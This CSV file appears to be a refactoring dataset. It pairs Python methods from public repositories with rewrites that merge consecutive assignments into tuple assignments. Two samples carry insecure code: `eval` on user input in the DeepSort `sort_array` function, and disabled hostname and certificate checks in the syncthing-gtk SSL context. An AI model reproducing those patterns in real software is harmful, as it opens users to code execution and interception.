repo_name,file_html,class_name,me_name,me_code,old_code,new_code
video-classification-3d-cnn-pytorch,https://github.com/kenshohara/video-classification-3d-cnn-pytorch/tree/master//spatial_transforms.py,CenterCrop,__call__$164,"def __call__(self, img):
        """"""
        Args:
            img (PIL.Image): Image to be cropped.
        Returns:
            PIL.Image: Cropped image.
        """"""
        w, h = img.size
        th, tw = self.size
        x1 = int(round((w - tw) / 2.))
        y1 = int(round((h - th) / 2.))
        return img.crop((x1, y1, x1 + tw, y1 + th))","x1 = int(round((w - tw) / 2.0))
y1 = int(round((h - th) / 2.0))","x1 , y1  = int(round((w - tw) / 2.0)), int(round((h - th) / 2.0))"
Machine-Learning-Collection,https://github.com/aladdinpersson/Machine-Learning-Collection/tree/master/ML/Projects/DeepSort/utils.py,,sort_array$10,"def sort_array(encoder, decoder, device, arr=None):
    """"""
    A very simple example of use of the model
    Input: encoder nn.Module
           decoder nn.Module
           device
           array to sort (optional)
    """"""

    if arr is None:
        arr = ask_user()

    with torch.no_grad():
        while arr != ""q"":
            # Avoid numerical errors by rounding to max_len
            arr = eval(arr)
            lengths = [
                len(str(elem).split(""."")[1]) if len(str(elem).split(""."")) > 1 else 0
                for elem in arr
            ]
            max_len = max(lengths)
            source = torch.tensor(arr, dtype=torch.float).to(device).unsqueeze(1)
            batch_size = source.shape[1]
            target_len = source.shape[0] + 1

            outputs = torch.zeros(target_len, batch_size, target_len - 1).to(device)
            encoder_states, hidden, cell = encoder(source)

            # First input will be <SOS> token
            x = torch.tensor([-1], dtype=torch.float).to(device)
            predictions = torch.zeros((target_len)).to(device)

            for t in range(1, target_len):
                # At every time step use encoder_states and update hidden, cell
                attention, energy, hidden, cell = decoder(
                    x, encoder_states, hidden, cell
                )

                # Store prediction for current time step
                outputs[t] = energy.permute(1, 0)

                # Get the best word the Decoder predicted (index in the vocabulary)
                best_guess = attention.argmax(0)
                predictions[t] = best_guess.item()
                x = torch.tensor([best_guess.item()], dtype=torch.float).to(device)

            output = [
                round(source[predictions[1:].long()][i, :].item(), max_len)
                for i in range(source.shape[0])
            ]

            print(f""Here's the result: {output}"")
            arr = ask_user()","max_len = max(lengths)
source = torch.tensor(arr, dtype=torch.float).to(device).unsqueeze(1)","max_len , source  = max(lengths), torch.tensor(arr, dtype=torch.float).to(device).unsqueeze(1)"
Machine-Learning-Collection,https://github.com/aladdinpersson/Machine-Learning-Collection/tree/master/ML/Projects/DeepSort/utils.py,,sort_array$10,"def sort_array(encoder, decoder, device, arr=None):
    """"""
    A very simple example of use of the model
    Input: encoder nn.Module
           decoder nn.Module
           device
           array to sort (optional)
    """"""

    if arr is None:
        arr = ask_user()

    with torch.no_grad():
        while arr != ""q"":
            # Avoid numerical errors by rounding to max_len
            arr = eval(arr)
            lengths = [
                len(str(elem).split(""."")[1]) if len(str(elem).split(""."")) > 1 else 0
                for elem in arr
            ]
            max_len = max(lengths)
            source = torch.tensor(arr, dtype=torch.float).to(device).unsqueeze(1)
            batch_size = source.shape[1]
            target_len = source.shape[0] + 1

            outputs = torch.zeros(target_len, batch_size, target_len - 1).to(device)
            encoder_states, hidden, cell = encoder(source)

            # First input will be <SOS> token
            x = torch.tensor([-1], dtype=torch.float).to(device)
            predictions = torch.zeros((target_len)).to(device)

            for t in range(1, target_len):
                # At every time step use encoder_states and update hidden, cell
                attention, energy, hidden, cell = decoder(
                    x, encoder_states, hidden, cell
                )

                # Store prediction for current time step
                outputs[t] = energy.permute(1, 0)

                # Get the best word the Decoder predicted (index in the vocabulary)
                best_guess = attention.argmax(0)
                predictions[t] = best_guess.item()
                x = torch.tensor([best_guess.item()], dtype=torch.float).to(device)

            output = [
                round(source[predictions[1:].long()][i, :].item(), max_len)
                for i in range(source.shape[0])
            ]

            print(f""Here's the result: {output}"")
            arr = ask_user()","batch_size = source.shape[1]
target_len = source.shape[0] + 1","batch_size , target_len  = source.shape[1], source.shape[0] + 1"
Machine-Learning-Collection,https://github.com/aladdinpersson/Machine-Learning-Collection/tree/master/ML/Projects/DeepSort/utils.py,,sort_array$10,"def sort_array(encoder, decoder, device, arr=None):
    """"""
    A very simple example of use of the model
    Input: encoder nn.Module
           decoder nn.Module
           device
           array to sort (optional)
    """"""

    if arr is None:
        arr = ask_user()

    with torch.no_grad():
        while arr != ""q"":
            # Avoid numerical errors by rounding to max_len
            arr = eval(arr)
            lengths = [
                len(str(elem).split(""."")[1]) if len(str(elem).split(""."")) > 1 else 0
                for elem in arr
            ]
            max_len = max(lengths)
            source = torch.tensor(arr, dtype=torch.float).to(device).unsqueeze(1)
            batch_size = source.shape[1]
            target_len = source.shape[0] + 1

            outputs = torch.zeros(target_len, batch_size, target_len - 1).to(device)
            encoder_states, hidden, cell = encoder(source)

            # First input will be <SOS> token
            x = torch.tensor([-1], dtype=torch.float).to(device)
            predictions = torch.zeros((target_len)).to(device)

            for t in range(1, target_len):
                # At every time step use encoder_states and update hidden, cell
                attention, energy, hidden, cell = decoder(
                    x, encoder_states, hidden, cell
                )

                # Store prediction for current time step
                outputs[t] = energy.permute(1, 0)

                # Get the best word the Decoder predicted (index in the vocabulary)
                best_guess = attention.argmax(0)
                predictions[t] = best_guess.item()
                x = torch.tensor([best_guess.item()], dtype=torch.float).to(device)

            output = [
                round(source[predictions[1:].long()][i, :].item(), max_len)
                for i in range(source.shape[0])
            ]

            print(f""Here's the result: {output}"")
            arr = ask_user()","x = torch.tensor([-1], dtype=torch.float).to(device)
predictions = torch.zeros(target_len).to(device)","x , predictions  = torch.tensor([-1], dtype=torch.float).to(device), torch.zeros(target_len).to(device)"
Machine-Learning-Collection,https://github.com/aladdinpersson/Machine-Learning-Collection/tree/master/ML/Projects/DeepSort/utils.py,,sort_array$10,"def sort_array(encoder, decoder, device, arr=None):
    """"""
    A very simple example of use of the model
    Input: encoder nn.Module
           decoder nn.Module
           device
           array to sort (optional)
    """"""

    if arr is None:
        arr = ask_user()

    with torch.no_grad():
        while arr != ""q"":
            # Avoid numerical errors by rounding to max_len
            arr = eval(arr)
            lengths = [
                len(str(elem).split(""."")[1]) if len(str(elem).split(""."")) > 1 else 0
                for elem in arr
            ]
            max_len = max(lengths)
            source = torch.tensor(arr, dtype=torch.float).to(device).unsqueeze(1)
            batch_size = source.shape[1]
            target_len = source.shape[0] + 1

            outputs = torch.zeros(target_len, batch_size, target_len - 1).to(device)
            encoder_states, hidden, cell = encoder(source)

            # First input will be <SOS> token
            x = torch.tensor([-1], dtype=torch.float).to(device)
            predictions = torch.zeros((target_len)).to(device)

            for t in range(1, target_len):
                # At every time step use encoder_states and update hidden, cell
                attention, energy, hidden, cell = decoder(
                    x, encoder_states, hidden, cell
                )

                # Store prediction for current time step
                outputs[t] = energy.permute(1, 0)

                # Get the best word the Decoder predicted (index in the vocabulary)
                best_guess = attention.argmax(0)
                predictions[t] = best_guess.item()
                x = torch.tensor([best_guess.item()], dtype=torch.float).to(device)

            output = [
                round(source[predictions[1:].long()][i, :].item(), max_len)
                for i in range(source.shape[0])
            ]

            print(f""Here's the result: {output}"")
            arr = ask_user()","outputs[t] = energy.permute(1, 0)
best_guess = attention.argmax(0)","outputs[t] , best_guess  = energy.permute(1, 0), attention.argmax(0)"
Machine-Learning-Collection,https://github.com/aladdinpersson/Machine-Learning-Collection/tree/master/ML/Projects/DeepSort/utils.py,,sort_array$10,"def sort_array(encoder, decoder, device, arr=None):
    """"""
    A very simple example of use of the model
    Input: encoder nn.Module
           decoder nn.Module
           device
           array to sort (optional)
    """"""

    if arr is None:
        arr = ask_user()

    with torch.no_grad():
        while arr != ""q"":
            # Avoid numerical errors by rounding to max_len
            arr = eval(arr)
            lengths = [
                len(str(elem).split(""."")[1]) if len(str(elem).split(""."")) > 1 else 0
                for elem in arr
            ]
            max_len = max(lengths)
            source = torch.tensor(arr, dtype=torch.float).to(device).unsqueeze(1)
            batch_size = source.shape[1]
            target_len = source.shape[0] + 1

            outputs = torch.zeros(target_len, batch_size, target_len - 1).to(device)
            encoder_states, hidden, cell = encoder(source)

            # First input will be <SOS> token
            x = torch.tensor([-1], dtype=torch.float).to(device)
            predictions = torch.zeros((target_len)).to(device)

            for t in range(1, target_len):
                # At every time step use encoder_states and update hidden, cell
                attention, energy, hidden, cell = decoder(
                    x, encoder_states, hidden, cell
                )

                # Store prediction for current time step
                outputs[t] = energy.permute(1, 0)

                # Get the best word the Decoder predicted (index in the vocabulary)
                best_guess = attention.argmax(0)
                predictions[t] = best_guess.item()
                x = torch.tensor([best_guess.item()], dtype=torch.float).to(device)

            output = [
                round(source[predictions[1:].long()][i, :].item(), max_len)
                for i in range(source.shape[0])
            ]

            print(f""Here's the result: {output}"")
            arr = ask_user()","predictions[t] = best_guess.item()
x = torch.tensor([best_guess.item()], dtype=torch.float).to(device)","predictions[t] , x  = best_guess.item(), torch.tensor([best_guess.item()], dtype=torch.float).to(device)"
s-tui,https://github.com/amanusk/s-tui/tree/master/s_tui/sources/freq_source.py,FreqSource,__init__$29,"def __init__(self):
        self.is_available = True
        if (not hasattr(psutil, ""cpu_freq"") and
                psutil.cpu_freq()):
            self.is_available = False
            logging.debug(""cpu_freq is not available from psutil"")
            return

        Source.__init__(self)

        self.name = 'Frequency'
        self.measurement_unit = 'MHz'
        self.pallet = ('freq light', 'freq dark',
                       'freq light smooth', 'freq dark smooth')

        # Check if psutil.cpu_freq is available.
        # +1 for average frequency
        self.last_measurement = [0] * len(psutil.cpu_freq(True))
        if psutil.cpu_freq(False):
            self.last_measurement.append(0)

        self.top_freq = psutil.cpu_freq().max
        self.max_freq = self.top_freq

        if self.top_freq == 0.0:
            # If top freq not available, take the current as top
            if max(self.last_measurement) >= 0:
                self.max_freq = max(self.last_measurement)

        self.available_sensors = ['Avg']
        for core_id, _ in enumerate(psutil.cpu_freq(True)):
            self.available_sensors.append(""Core "" + str(core_id))","self.name = 'Frequency'
self.measurement_unit = 'MHz'
self.pallet = ('freq light', 'freq dark', 'freq light smooth', 'freq dark smooth')
self.last_measurement = [0] * len(psutil.cpu_freq(True))","self.name , self.measurement_unit , self.pallet , self.last_measurement  = 'Frequency', 'MHz', ('freq light', 'freq dark', 'freq light smooth', 'freq dark smooth'), [0] * len(psutil.cpu_freq(True))"
syncthing-gtk,https://github.com/kozec/syncthing-gtk/tree/master/syncthing_gtk/iddialog.py,,create_ssl_context$97,"def create_ssl_context():
	"""""" May return NULL if ssl is not available """"""
	if hasattr(ssl, ""create_default_context""):
		ctx = ssl.create_default_context()
		ctx.check_hostname = False
		ctx.verify_mode = ssl.CERT_NONE
	else:
		log.warning(""SSL is not available, cannot verify server certificate."")","ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE","ctx.check_hostname , ctx.verify_mode  = False, ssl.CERT_NONE"
rotki,https://github.com/rotki/rotki/tree/master/rotkehlchen/tests/api/test_exchanges.py,,test_exchange_query_balances$482,"def test_exchange_query_balances(rotkehlchen_api_server_with_exchanges):
    """"""Test that using the exchange balances query endpoint works fine""""""
    async_query = random.choice([False, True])
    rotki = rotkehlchen_api_server_with_exchanges.rest_api.rotkehlchen
    # query balances of one specific exchange
    server = rotkehlchen_api_server_with_exchanges
    binance = try_get_first_exchange(rotki.exchange_manager, Location.BINANCE)

    binance_patch = patch_binance_balances_query(binance)
    with binance_patch:
        response = requests.get(api_url_for(
            server,
            'named_exchanges_balances_resource',
            location='binance',
        ), json={'async_query': async_query})
        if async_query:
            task_id = assert_ok_async_response(response)
            outcome = wait_for_async_task_with_result(server, task_id)
        else:
            outcome = assert_proper_response_with_result(response)
    assert_binance_balances_result(outcome)

    # query balances of all setup exchanges
    poloniex = try_get_first_exchange(rotki.exchange_manager, Location.POLONIEX)
    poloniex_patch = patch_poloniex_balances_query(poloniex)
    with binance_patch, poloniex_patch:
        response = requests.get(
            api_url_for(server, 'exchangebalancesresource'),
            json={'async_query': async_query},
        )
        if async_query:
            task_id = assert_ok_async_response(response)
            result = wait_for_async_task_with_result(server, task_id)
        else:
            result = assert_proper_response_with_result(response)

    assert_binance_balances_result(result['binance'])
    assert_poloniex_balances_result(result['poloniex'])","async_query = random.choice([False, True])
rotki = rotkehlchen_api_server_with_exchanges.rest_api.rotkehlchen","async_query , rotki  = random.choice([False, True]), rotkehlchen_api_server_with_exchanges.rest_api.rotkehlchen"
rotki,https://github.com/rotki/rotki/tree/master/rotkehlchen/tests/api/test_exchanges.py,,test_exchange_query_balances$482,"def test_exchange_query_balances(rotkehlchen_api_server_with_exchanges):
    """"""Test that using the exchange balances query endpoint works fine""""""
    async_query = random.choice([False, True])
    rotki = rotkehlchen_api_server_with_exchanges.rest_api.rotkehlchen
    # query balances of one specific exchange
    server = rotkehlchen_api_server_with_exchanges
    binance = try_get_first_exchange(rotki.exchange_manager, Location.BINANCE)

    binance_patch = patch_binance_balances_query(binance)
    with binance_patch:
        response = requests.get(api_url_for(
            server,
            'named_exchanges_balances_resource',
            location='binance',
        ), json={'async_query': async_query})
        if async_query:
            task_id = assert_ok_async_response(response)
            outcome = wait_for_async_task_with_result(server, task_id)
        else:
            outcome = assert_proper_response_with_result(response)
    assert_binance_balances_result(outcome)

    # query balances of all setup exchanges
    poloniex = try_get_first_exchange(rotki.exchange_manager, Location.POLONIEX)
    poloniex_patch = patch_poloniex_balances_query(poloniex)
    with binance_patch, poloniex_patch:
        response = requests.get(
            api_url_for(server, 'exchangebalancesresource'),
            json={'async_query': async_query},
        )
        if async_query:
            task_id = assert_ok_async_response(response)
            result = wait_for_async_task_with_result(server, task_id)
        else:
            result = assert_proper_response_with_result(response)

    assert_binance_balances_result(result['binance'])
    assert_poloniex_balances_result(result['poloniex'])","server = rotkehlchen_api_server_with_exchanges
binance = try_get_first_exchange(rotki.exchange_manager, Location.BINANCE)","server , binance  = rotkehlchen_api_server_with_exchanges, try_get_first_exchange(rotki.exchange_manager, Location.BINANCE)"
alexa-skills-kit-sdk-for-python,https://github.com/alexa/alexa-skills-kit-sdk-for-python/tree/master/ask-sdk/tests/unit/test_standard.py,TestStandardSkillBuilder,test_persistence_adapter_set$49,"def test_persistence_adapter_set(self):
        test_table_name = ""TestTable""
        test_dynamodb_resource = mock.Mock()
        test_partition_keygen = mock.Mock()
        test_auto_create_table = False

        test_skill_builder = StandardSkillBuilder(
            table_name=test_table_name,
            auto_create_table=test_auto_create_table,
            partition_keygen=test_partition_keygen,
            dynamodb_client=test_dynamodb_resource)

        actual_skill_config = test_skill_builder.skill_configuration
        actual_adapter = actual_skill_config.persistence_adapter

        assert isinstance(
            actual_adapter, DynamoDbAdapter), (
            ""Standard Skill Builder set incorrect persistence adapter in ""
            ""skill configuration"")

        assert actual_adapter.table_name == test_table_name, (
            ""Standard Skill Builder set persistence adapter with incorrect ""
            ""table name in skill configuration"")
        assert actual_adapter.partition_keygen == test_partition_keygen, (
            ""Standard Skill Builder set persistence adapter with incorrect ""
            ""partition key generator function in skill configuration"")
        assert actual_adapter.create_table == test_auto_create_table, (
            ""Standard Skill Builder set persistence adapter with incorrect ""
            ""auto create table flag in skill configuration"")
        assert actual_adapter.dynamodb == test_dynamodb_resource, (
            ""Standard Skill Builder set persistence adapter with incorrect ""
            ""dynamo db resource in skill configuration"")","test_table_name = 'TestTable'
test_dynamodb_resource = mock.Mock()
test_partition_keygen = mock.Mock()
test_auto_create_table = False","test_table_name , test_dynamodb_resource , test_partition_keygen , test_auto_create_table  = 'TestTable', mock.Mock(), mock.Mock(), False"
hand-graph-cnn,https://github.com/3d-hand-shape/hand-graph-cnn/tree/master/hand_shape_pose/data/dataset/STB_dataset.py,,SK_rot_mx$35,"def SK_rot_mx(rot_vec):
    """"""
    use Rodrigues' rotation formula to transform the rotation vector into rotation matrix
    :param rot_vec:
    :return:
    """"""
    theta = LA.norm(rot_vec)
    vector = np.array(rot_vec) * math.sin(theta / 2.0) / theta
    a = math.cos(theta / 2.0)
    b = -vector[0]
    c = -vector[1]
    d = -vector[2]
    return np.array([[a * a + b * b - c * c - d * d, 2 * (b * c + a * d), 2 * (b * d - a * c)],
                     [2 * (b * c - a * d), a * a + c * c - b * b - d * d, 2 * (c * d + a * b)],
                     [2 * (b * d + a * c), 2 * (c * d - a * b), a * a + d * d - b * b - c * c]])","a = math.cos(theta / 2.0)
b = -vector[0]
c = -vector[1]
d = -vector[2]","a , b , c , d  = math.cos(theta / 2.0), -vector[0], -vector[1], -vector[2]"
espnet,https://github.com/espnet/espnet/tree/master/espnet2/gan_tts/joint/joint_text2wav.py,JointText2Wav,_forward_discrminator$511,"def _forward_discrminator(
        self,
        text: torch.Tensor,
        text_lengths: torch.Tensor,
        feats: torch.Tensor,
        feats_lengths: torch.Tensor,
        speech: torch.Tensor,
        speech_lengths: torch.Tensor,
        **kwargs,
    ) -> Dict[str, Any]:
        """"""Perform discriminator forward.

        Args:
            text (Tensor): Text index tensor (B, T_text).
            text_lengths (Tensor): Text length tensor (B,).
            feats (Tensor): Feature tensor (B, T_feats, aux_channels).
            feats_lengths (Tensor): Feature length tensor (B,).
            speech (Tensor): Speech waveform tensor (B, T_wav).
            speech_lengths (Tensor): Speech length tensor (B,).

        Returns:
            Dict[str, Any]:
                * loss (Tensor): Loss scalar tensor.
                * stats (Dict[str, float]): Statistics to be monitored.
                * weight (Tensor): Weight tensor to summarize losses.
                * optim_idx (int): Optimizer index (0 for G and 1 for D).

        """"""
        # setup
        batch_size = text.size(0)
        speech = speech.unsqueeze(1)

        # calculate generator outputs
        reuse_cache = True
        if not self.cache_generator_outputs or self._cache is None:
            reuse_cache = False
            # calculate text2mel outputs
            text2mel_loss, stats, feats_gen = self.generator[""text2mel""](
                text=text,
                text_lengths=text_lengths,
                feats=feats,
                feats_lengths=feats_lengths,
                joint_training=True,
                **kwargs,
            )
            # get random segments
            feats_gen_, start_idxs = get_random_segments(
                x=feats_gen.transpose(1, 2),
                x_lengths=feats_lengths,
                segment_size=self.segment_size,
            )
            # calculate vocoder outputs
            speech_hat_ = self.generator[""vocoder""](feats_gen_)
            if self.use_pqmf:
                speech_hat_ = self.pqmf.synthesis(speech_hat_)
        else:
            _, _, speech_hat_, start_idxs = self._cache

        # store cache
        if self.cache_generator_outputs and not reuse_cache:
            self._cache = (text2mel_loss, stats, speech_hat_, start_idxs)

        # parse outputs
        speech_ = get_segments(
            x=speech,
            start_idxs=start_idxs * self.generator[""vocoder""].upsample_factor,
            segment_size=self.segment_size * self.generator[""vocoder""].upsample_factor,
        )

        # calculate discriminator outputs
        p_hat = self.discriminator(speech_hat_.detach())
        p = self.discriminator(speech_)

        # calculate losses
        real_loss, fake_loss = self.discriminator_adv_loss(p_hat, p)
        loss = real_loss + fake_loss

        stats = dict(
            discriminator_loss=loss.item(),
            real_loss=real_loss.item(),
            fake_loss=fake_loss.item(),
        )
        loss, stats, weight = force_gatherable((loss, stats, batch_size), loss.device)

        # reset cache
        if reuse_cache or not self.training:
            self._cache = None

        return {
            ""loss"": loss,
            ""stats"": stats,
            ""weight"": weight,
            ""optim_idx"": 1,  # needed for trainer
        }","batch_size = text.size(0)
speech = speech.unsqueeze(1)
reuse_cache = True","batch_size , speech , reuse_cache  = text.size(0), speech.unsqueeze(1), True"
espnet,https://github.com/espnet/espnet/tree/master/espnet2/gan_tts/joint/joint_text2wav.py,JointText2Wav,_forward_discrminator$511,"def _forward_discrminator(
        self,
        text: torch.Tensor,
        text_lengths: torch.Tensor,
        feats: torch.Tensor,
        feats_lengths: torch.Tensor,
        speech: torch.Tensor,
        speech_lengths: torch.Tensor,
        **kwargs,
    ) -> Dict[str, Any]:
        """"""Perform discriminator forward.

        Args:
            text (Tensor): Text index tensor (B, T_text).
            text_lengths (Tensor): Text length tensor (B,).
            feats (Tensor): Feature tensor (B, T_feats, aux_channels).
            feats_lengths (Tensor): Feature length tensor (B,).
            speech (Tensor): Speech waveform tensor (B, T_wav).
            speech_lengths (Tensor): Speech length tensor (B,).

        Returns:
            Dict[str, Any]:
                * loss (Tensor): Loss scalar tensor.
                * stats (Dict[str, float]): Statistics to be monitored.
                * weight (Tensor): Weight tensor to summarize losses.
                * optim_idx (int): Optimizer index (0 for G and 1 for D).

        """"""
        # setup
        batch_size = text.size(0)
        speech = speech.unsqueeze(1)

        # calculate generator outputs
        reuse_cache = True
        if not self.cache_generator_outputs or self._cache is None:
            reuse_cache = False
            # calculate text2mel outputs
            text2mel_loss, stats, feats_gen = self.generator[""text2mel""](
                text=text,
                text_lengths=text_lengths,
                feats=feats,
                feats_lengths=feats_lengths,
                joint_training=True,
                **kwargs,
            )
            # get random segments
            feats_gen_, start_idxs = get_random_segments(
                x=feats_gen.transpose(1, 2),
                x_lengths=feats_lengths,
                segment_size=self.segment_size,
            )
            # calculate vocoder outputs
            speech_hat_ = self.generator[""vocoder""](feats_gen_)
            if self.use_pqmf:
                speech_hat_ = self.pqmf.synthesis(speech_hat_)
        else:
            _, _, speech_hat_, start_idxs = self._cache

        # store cache
        if self.cache_generator_outputs and not reuse_cache:
            self._cache = (text2mel_loss, stats, speech_hat_, start_idxs)

        # parse outputs
        speech_ = get_segments(
            x=speech,
            start_idxs=start_idxs * self.generator[""vocoder""].upsample_factor,
            segment_size=self.segment_size * self.generator[""vocoder""].upsample_factor,
        )

        # calculate discriminator outputs
        p_hat = self.discriminator(speech_hat_.detach())
        p = self.discriminator(speech_)

        # calculate losses
        real_loss, fake_loss = self.discriminator_adv_loss(p_hat, p)
        loss = real_loss + fake_loss

        stats = dict(
            discriminator_loss=loss.item(),
            real_loss=real_loss.item(),
            fake_loss=fake_loss.item(),
        )
        loss, stats, weight = force_gatherable((loss, stats, batch_size), loss.device)

        # reset cache
        if reuse_cache or not self.training:
            self._cache = None

        return {
            ""loss"": loss,
            ""stats"": stats,
            ""weight"": weight,
            ""optim_idx"": 1,  # needed for trainer
        }","p_hat = self.discriminator(speech_hat_.detach())
p = self.discriminator(speech_)","p_hat , p  = self.discriminator(speech_hat_.detach()), self.discriminator(speech_)"
smart_login,https://github.com/SpiderClub/smart_login/tree/master/sina_login/sina_login_direct.py,,get_pincode_url$28,"def get_pincode_url(pcid):
    size = 0
    url = ""http://login.sina.com.cn/cgi/pin.php""
    pincode_url = '{}?r={}&s={}&p={}'.format(url, math.floor(random.random() * 100000000), size, pcid)
    return pincode_url","size = 0
url = 'http://login.sina.com.cn/cgi/pin.php'","size , url  = 0, 'http://login.sina.com.cn/cgi/pin.php'"
veusz,https://github.com/veusz/veusz/tree/master/veusz/document/svg_export.py,SVGPaintEngine,__init__$141,"def __init__(self, writetextastext=False):
        qt.QPaintEngine.__init__(
            self,
            qt.QPaintEngine.Antialiasing |
            qt.QPaintEngine.PainterPaths |
            qt.QPaintEngine.PrimitiveTransform |
            qt.QPaintEngine.PaintOutsidePaintEvent |
            qt.QPaintEngine.PixmapTransform |
            qt.QPaintEngine.AlphaBlend
        )

        self.imageformat = 'png'
        self.writetextastext = writetextastext","self.imageformat = 'png'
self.writetextastext = writetextastext","self.imageformat , self.writetextastext  = 'png', writetextastext"
transformers,https://github.com/huggingface/transformers/tree/master/src/transformers/models/cpm/tokenization_cpm_fast.py,CpmTokenizerFast,build_inputs_with_special_tokens$157,"def build_inputs_with_special_tokens(
        self, token_ids_0: List[int], token_ids_1: Optional[List[int]] = None
    ) -> List[int]:
        """"""
        Build model inputs from a sequence or a pair of sequence for sequence classification tasks by concatenating and
        adding special tokens. An XLNet sequence has the following format:

        - single sequence: `X <sep> <cls>`
        - pair of sequences: `A <sep> B <sep> <cls>`

        Args:
            token_ids_0 (`List[int]`):
                List of IDs to which the special tokens will be added.
            token_ids_1 (`List[int]`, *optional*):
                Optional second list of IDs for sequence pairs.

        Returns:
            `List[int]`: List of [input IDs](../glossary#input-ids) with the appropriate special tokens.
        """"""
        sep = [self.sep_token_id]
        cls = [self.cls_token_id]
        if token_ids_1 is None:
            return token_ids_0 + sep + cls
        return token_ids_0 + sep + token_ids_1 + sep + cls","sep = [self.sep_token_id]
cls = [self.cls_token_id]","sep , cls  = [self.sep_token_id], [self.cls_token_id]"
astropy,https://github.com/astropy/astropy/tree/master/astropy/time/tests/test_quantity_interaction.py,TestTimeQuantity,test_valid_quantity_operations$79,"def test_valid_quantity_operations(self):
        """"""Check that adding a time-valued quantity to a Time gives a Time""""""
        t0 = Time(100000.0, format=""cxcsec"")
        q1 = 10.0 * u.second
        t1 = t0 + q1
        assert isinstance(t1, Time)
        assert t1.value == t0.value + q1.to_value(u.second)
        q2 = 1.0 * u.day
        t2 = t0 - q2
        assert allclose_sec(t2.value, t0.value - q2.to_value(u.second))
        # check broadcasting
        q3 = np.arange(15.0).reshape(3, 5) * u.hour
        t3 = t0 - q3
        assert t3.shape == q3.shape
        assert allclose_sec(t3.value, t0.value - q3.to_value(u.second))","t0 = Time(100000.0, format='cxcsec')
q1 = 10.0 * u.second","t0 , q1  = Time(100000.0, format='cxcsec'), 10.0 * u.second"
mathematics_dataset,https://github.com/deepmind/mathematics_dataset/tree/master/mathematics_dataset/util/probability.py,FiniteProductSpace,probability$228,"def probability(self, event):
    # Specializations for optimization.
    if isinstance(event, FiniteProductEvent):
      assert len(self._spaces) == len(event.events)
      return sympy.prod([
          space.probability(event_slice)
          for space, event_slice in zip(self._spaces, event.events)])

    if isinstance(event, CountLevelSetEvent) and self.all_spaces_equal():
      space = self._spaces[0]
      counts = event.counts
      probabilities = {
          value: space.probability(DiscreteEvent({value}))
          for value in six.iterkeys(counts)
      }

      num_events = sum(six.itervalues(counts))
      assert num_events == len(self._spaces)
      # Multinomial coefficient:
      coeff = (
          sympy.factorial(num_events) / sympy.prod(
              [sympy.factorial(i) for i in six.itervalues(counts)]))
      return coeff * sympy.prod([
          pow(probabilities[value], counts[value])
          for value in six.iterkeys(counts)
      ])

    raise ValueError('Unhandled event type {}'.format(type(event)))","space = self._spaces[0]
counts = event.counts","space , counts  = self._spaces[0], event.counts"
mathematics_dataset,https://github.com/deepmind/mathematics_dataset/tree/master/mathematics_dataset/util/probability.py,FiniteProductSpace,probability$228,"def probability(self, event):
    # Specializations for optimization.
    if isinstance(event, FiniteProductEvent):
      assert len(self._spaces) == len(event.events)
      return sympy.prod([
          space.probability(event_slice)
          for space, event_slice in zip(self._spaces, event.events)])

    if isinstance(event, CountLevelSetEvent) and self.all_spaces_equal():
      space = self._spaces[0]
      counts = event.counts
      probabilities = {
          value: space.probability(DiscreteEvent({value}))
          for value in six.iterkeys(counts)
      }

      num_events = sum(six.itervalues(counts))
      assert num_events == len(self._spaces)
      # Multinomial coefficient:
      coeff = (
          sympy.factorial(num_events) / sympy.prod(
              [sympy.factorial(i) for i in six.itervalues(counts)]))
      return coeff * sympy.prod([
          pow(probabilities[value], counts[value])
          for value in six.iterkeys(counts)
      ])

    raise ValueError('Unhandled event type {}'.format(type(event)))","probabilities = {value: space.probability(DiscreteEvent({value})) for value in six.iterkeys(counts)}
num_events = sum(six.itervalues(counts))","probabilities , num_events  = {value: space.probability(DiscreteEvent({value})) for value in six.iterkeys(counts)}, sum(six.itervalues(counts))"
CtCI-6th-Edition-Python,https://github.com/careercup/CtCI-6th-Edition-Python/tree/master/chapter_04/p02_minimal_tree.py,,array_to_binary_tree$22,"def array_to_binary_tree(array, start, end):
    if start > end:
        return None
    mid = (
        start + end
    ) // 2  # This must be floor division, otherwise you get a slice error
    # TypeError: list indices must be integers or slices, not float
    root = Node(array[mid])
    root.left = array_to_binary_tree(array, start, mid - 1)
    root.right = array_to_binary_tree(array, mid + 1, end)
    return root","root.left = array_to_binary_tree(array, start, mid - 1)
root.right = array_to_binary_tree(array, mid + 1, end)","root.left , root.right  = array_to_binary_tree(array, start, mid - 1), array_to_binary_tree(array, mid + 1, end)"
